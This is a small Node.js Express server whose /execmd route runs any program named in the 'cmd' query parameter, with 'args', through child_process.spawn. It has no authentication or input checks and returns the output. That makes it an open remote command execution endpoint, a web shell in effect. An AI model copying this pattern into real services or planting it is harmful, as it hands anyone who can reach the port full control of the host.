const express = require('express');
const { spawn } = require('node:child_process');
const app = express();
const port = 3000;

app.get('/execmd', (req, res) => {
    if (!req.query.cmd) {
      return res.send({
        error: 'cmd has to be provided',
      });
    }

    if (!req.query.args) {
        return res.send({
          error: 'args has to be provided',
        });
    }

    const command = spawn(req.query.cmd, [req.query.args]);

    command.stdout.on('data', (data) => {

      return res.send({
          result: data.toString()
      });

    });
});

app.get('*', (_, res) => {
  return res.send('<h1>404</h1>');
});

app.listen(port, () => {
  console.log(`app listening on port ${port}...`)
});

